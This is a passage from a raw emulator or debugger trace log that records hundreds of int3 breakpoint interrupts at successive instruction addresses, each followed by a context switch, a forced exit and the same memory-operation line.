Breakpoint), cip = 45a40d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a415, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a421, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a42f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a440, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a450, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a467, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a478, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a49b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a4b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a4c1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a4e1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a4fb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a500, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a520, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a590, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a596, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a5a9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a5c5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a5d9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a5e1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a5f7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a60b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a61f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a624, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a63b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a64d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a65d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a66e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a684, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a699, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a6b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a6c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a6cb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a6e0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a6fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a70c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a715, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a731, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a75a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a768, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a785, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a7a0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a7b4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a83f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a86d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a886, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a88e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a8b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a8bc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a8ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a8fc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a914, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a925, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a938, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a952, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a961, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a970, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a982, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a992, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a999, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9bb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9c6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9d0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9de, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a9f9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aa15, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aa29, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aa48, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aa63, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aadd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aaf5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab0d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab0d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab0d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab25, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab2a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab35, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab49, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab5f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab72, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab8d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ab99, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45abba, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45abd2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45abee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac0b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac18, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac33, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac4a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac5e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac65, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac70, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac8a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ac9c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45acb9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45acc3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45acdd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ace1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45acf7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45acfb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad06, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad19, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad30, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad35, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad4e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ad59, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45adf7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae11, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae37, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae4b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae61, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae78, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae83, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ae9d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aea3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aeb2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aecc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aeec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45aef9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af12, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af1f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af34, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af4e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af63, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af77, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45af95, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afbd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afdb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45afec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45affc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b003, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b01b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b078, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b081, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b097, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b0b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b0cd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b0d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b0f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b0fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b10d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b112, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b11c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b132, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b13a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b13f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b151, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b15e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b171, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b193, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b1a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b1c3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b1e3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b1f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b20c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b21f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b240, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b253, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b266, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b271, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b30a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b32d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b33b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b345, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b364, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b378, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b383, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b397, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b3b0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b3d1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b3ea, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b403, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b41b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b427, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b43a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b455, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b459, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b474, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b479, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b48b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b4ab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b4bf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b4cf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b4e3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b503, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b512, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b52d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b53d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b54e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b56c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b580, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b613, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b621, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b629, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b642, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b663, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b671, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b67f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b695, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b6aa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b6c0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b6d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b6f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b70a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b70a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b70a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b724, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b738, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b743, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b754, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b76e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b775, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b78a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b797, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b79f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 